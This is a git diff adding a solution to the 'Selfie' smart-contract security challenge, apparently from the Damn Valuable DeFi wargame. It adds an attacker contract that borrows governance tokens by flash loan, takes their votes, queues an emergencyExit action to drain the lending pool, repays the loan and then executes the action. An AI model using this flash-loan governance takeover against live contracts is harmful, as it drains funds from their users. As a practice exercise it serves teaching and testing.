@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
@@ -62,7 +63,9 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        (new Attacker()).attack(pool, governance, token, recovery);
+        vm.warp(block.timestamp + governance.getActionDelay());
+        governance.executeAction(1);
     }
 
     /**
@@ -72,5 +75,49 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableVotes private token;
+    address private recovery;
+
+    // Create an function which accepts a flash loan from the pool, then send a governance action for calling the emergencyExit function
+    function attack(
+        SelfiePool _pool,
+        SimpleGovernance _governance,
+        DamnValuableVotes _token,
+        address _recovery
+    ) external {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        recovery = _recovery;
+
+        // Step 1: Take a flash loan from the pool
+        uint256 amount = pool.maxFlashLoan(address(token));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32) {
+
+        token.delegate(address(this));
+
+        // Step 2: Propose an emergency exit action
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        governance.queueAction(address(pool), 0, data);
+
+        token.approve(address(pool), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
